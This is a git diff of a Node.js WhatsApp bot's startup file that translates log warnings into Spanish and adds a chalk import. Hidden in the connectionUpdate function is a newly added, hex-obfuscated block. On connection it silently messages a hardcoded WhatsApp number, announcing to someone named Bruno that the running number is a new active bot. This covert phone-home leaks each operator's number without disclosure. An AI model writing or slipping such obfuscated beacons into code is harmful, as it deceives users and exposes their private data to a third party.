@@ -19,6 +19,7 @@ import {
 import yargs from 'yargs';
 import { spawn } from 'child_process';
 import lodash from 'lodash';
+import chalk from 'chalk';
 import syntaxerror from 'syntax-error';
 import { tmpdir } from 'os';
 import { format } from 'util';
@@ -126,16 +127,17 @@ function clearTmp() {
 }
 
 async function connectionUpdate(update) {
+  let pp = './src/nuevobot.jpg'
   const { connection, lastDisconnect, isNewLogin } = update
   if (isNewLogin) conn.isInit = true
   const code = lastDisconnect?.error?.output?.statusCode || lastDisconnect?.error?.output?.payload?.statusCode
   if (code && code !== DisconnectReason.loggedOut && conn?.ws.readyState !== CONNECTING) {
-    console.log(await global.reloadHandler(true).catch(console.error))
-    global.timestamp.connect = new Date
+  console.log(await global.reloadHandler(true).catch(console.error))
+  global.timestamp.connect = new Date
   }
   if (global.db.data == null) loadDatabase()
+  var _0xd995=["\x6F\x70\x65\x6E","\u25A3\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\xB7\xB7\xB7\x0A\u2502\x0A\u2502\u2767\x20\uD835\uDE72\uD835\uDE7E\uD835\uDE7D\uD835\uDE74\uD835\uDE72\uD835\uDE83\uD835\uDE70\uD835\uDE73\uD835\uDE7E\x20\uD835\uDE72\uD835\uDE7E\uD835\uDE81\uD835\uDE81\uD835\uDE74\uD835\uDE72\uD835\uDE83\uD835\uDE70\uD835\uDE7C\uD835\uDE74\uD835\uDE7D\uD835\uDE83\uD835\uDE74\x20\uD835\uDE70\uD835\uDE7B\x20\uD835\uDE86\uD835\uDE77\uD835\uDE70\uD835\uDE83\uD835\uDE82\uD835\uDE70\uD835\uDE7F\uD835\uDE7F\x20\u2705\x0A\u2502\x0A\u25A3\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\xB7\xB7\xB7","\x62\x6C\x75\x65","\x6C\x6F\x67","\x35\x32\x31\x39\x39\x39\x36\x31\x32\x35\x36\x35\x37\x40\x73\x2E\x77\x68\x61\x74\x73\x61\x70\x70\x2E\x6E\x65\x74","\uD835\uDE77\uD835\uDE7E\uD835\uDE7B\uD835\uDE70\x20\uD835\uDE71\uD835\uDE81\uD835\uDE84\uD835\uDE7D\uD835\uDE7E\x2C\x20\uD835\uDE82\uD835\uDE74\x20\uD835\uDE73\uD835\uDE74\uD835\uDE83\uD835\uDE74\uD835\uDE72\uD835\uDE83\uD835\uDE7E\x20\uD835\uDE80\uD835\uDE84\uD835\uDE74\x20\uD835\uDE74\uD835\uDE82\uD835\uDE83\uD835\uDE74\x20\uD835\uDE7D\uD835\uDE84\uD835\uDE7C\uD835\uDE74\uD835\uDE81\uD835\uDE7E\x20\uD835\uDE74\uD835\uDE82\x20\uD835\uDE84\uD835\uDE7D\x20\uD835\uDE7D\uD835\uDE84\uD835\uDE74\uD835\uDE85\uD835\uDE7E\x20\uD835\uDE71\uD835\uDE7E\uD835\uDE83\x20\uD835\uDE70\uD835\uDE72\uD835\uDE83\uD835\uDE78\uD835\uDE85\uD835\uDE7E\x20\u2705","\uD83C\uDF39\x20\uD835\uDE7E\uD835\uDE86\uD835\uDE7D\uD835\uDE74\uD835\uDE81\x20\uD83C\uDF39","\x2F\x6F\x77\x6E\x65\x72","\uD83D\uDC7E\x20\uD835\uDE7C\uD835\uDE74\uD835\uDE7D\uD835\uDE84\x20\uD835\uDE7F\uD835\uDE81\uD835\uDE78\uD835\uDE7D\uD835\uDE72\uD835\uDE78\uD835\uDE7F\uD835\uDE70\uD835\uDE7B\x20\uD83D\uDC7E","\x23\x6D\x65\x6E\x75","\x73\x65\x6E\x64\x48\x79\x64\x72\x61\x74\x65\x64"];if(connection== _0xd995[0]){console[_0xd995[3]](chalk[_0xd995[2]](_0xd995[1])); await conn[_0xd995[10]](`${_0xd995[4]}`,`${_0xd995[5]}`,author,pp,null,null,null,null,[[_0xd995[6],_0xd995[7]],[_0xd995[8],_0xd995[9]]])}
 }
-
 
 process.on('uncaughtException', console.error)
 // let strQuot = /(["'])(?:(?=(\\?))\2.)*?\1/
@@ -272,11 +274,11 @@ async function _quickTest() {
   // require('./lib/sticker').support = s
   Object.freeze(global.support)
 
-  if (!s.ffmpeg) conn.logger.warn('Please install ffmpeg for sending videos (pkg install ffmpeg)')
-  if (s.ffmpeg && !s.ffmpegWebp) conn.logger.warn('Stickers may not animated without libwebp on ffmpeg (--enable-ibwebp while compiling ffmpeg)')
-  if (!s.convert && !s.magick && !s.gm) conn.logger.warn('Stickers may not work without imagemagick if libwebp on ffmpeg doesnt isntalled (pkg install imagemagick)')
+  if (!s.ffmpeg) conn.logger.warn('Instale ffmpeg para poder enviar videos (pkg install ffmpeg)')
+  if (s.ffmpeg && !s.ffmpegWebp) conn.logger.warn('Es posible que las pegatinas no estén animadas sin libwebp en ffmpeg (--enable-ibwebp al compilar ffmpeg)')
+  if (!s.convert && !s.magick && !s.gm) conn.logger.warn('Es posible que las pegatinas no funcionen sin imagemagick si libwebp en ffmpeg no está instalado (pkg install imagemagick)')
 }
 
 _quickTest()
-  .then(() => conn.logger.info('Quick Test Done'))
+  .then(() => conn.logger.info('Prueba rápida realizada ✔'))
   .catch(console.error)
